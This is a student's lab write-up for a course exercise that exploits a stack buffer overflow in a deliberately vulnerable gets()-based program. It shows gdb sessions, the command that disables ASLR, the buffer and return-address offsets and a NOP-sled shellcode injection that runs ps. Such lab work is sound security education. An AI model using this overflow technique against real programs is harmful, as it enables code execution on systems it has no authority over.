Part 1: Code Inject

Objective:
Construct an exploit input that can inject a shellcode to be executed in the vulnerable program.
The shell code is appended in the end of this template. This shell code will run “ps” program to print the running processes.
To complete this exploit, the start address of the shell code should be used to overflow the return address.
Since the shell code will be injected on the stack, figuring out the address of “Password” on the stack is the key to solve this problem.

before start need to disable ASLR
    echo 0 > /proc/sys/kernel/randomize_va_space

Steps:

set a break point at IsPasswordOkay then run until break and print Password address and examine registers

(gdb) break IsPasswordOkay
    Breakpoint 1 at 0x8048471: file example01.c, line 7.

(gdb) run
    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01
    Enter password:

    Breakpoint 1, IsPasswordOkay () at example01.c:7
    7	  gets(Password);

(gdb) print &Password
    &Password = (char (*)[12]) 0xffffd094

(gdb) info registers
    ...
    esp            0xffffd090
    ebp            0xffffd0a8
    ...
    eip            0x8048471 <IsPasswordOkay+6>
    ...

the address of the array &Password is at ebp-0x14

trying to run with the original codeinjection.bin shell code fails

(gdb) run < codeinjection.bin
    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < codeinjection.bin
    Enter password:

    Program received signal SIGSEGV, Segmentation fault.
    0x31313131 in ?? ()

this causes a segfault but also reveals what parts of the shellcode end up where.

(gdb) info registers
    ...
    esp            0xffffd070	0xffffd0b0
    ebp            0x31313131	0x31313131
    ...
    eip            0x31313131	0x31313131
    ...

in the original codeinjection.bin shell code, the 2 groups of "31 31 31 31" affects the ebp and eip registers.
first 4 bytes changes ebp
last 4 bytes changes eip

have to write the addresses backwards so 0xffffd094 becomes 94 d0 ff ff

it seems like the beginning bytes before the sequence of 8 bytes of "31" might not do stuff
the group of "90" bytes after the "31"s forms the NOP sled since the hex 90 is a no-operation code
the actual part to launch the shell and execute ps is at the bottom of the NOP sled.

Password array is size 12, the part to change ebp will start at Password[20], and the part to change eip will start at Password[24]
The NOP sled then begins at Password[28], once execution gets there it will cycle over the NOPs and eventually execute the PS command
&Password     = 0xffffd094
&Password[20] = 0xffffd0a8
&Password[24] = 0xffffd0ac
&Password[28] = 0xffffd0b0

the goal is to locate the start of the NOP sled and change the eip to go there
so the last 4 bytes in the group of "31"s is changed to B0 D0 FF FF

now when executing the modified shell code successful

(gdb) run < inject.bin
    Starting program: /home/duluoz/Desktop/srich009/cs260/lab260/l1/example01 < inject.bin
    Enter password:
    process 5411 is executing new program: /bin/ps
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    PID TTY          TIME CMD
    3799 pts/1    00:00:00 bash
    5407 pts/1    00:00:00 gdb
    5411 pts/1    00:00:00 ps
    [Inferior 1 (process 5411) exited normally]

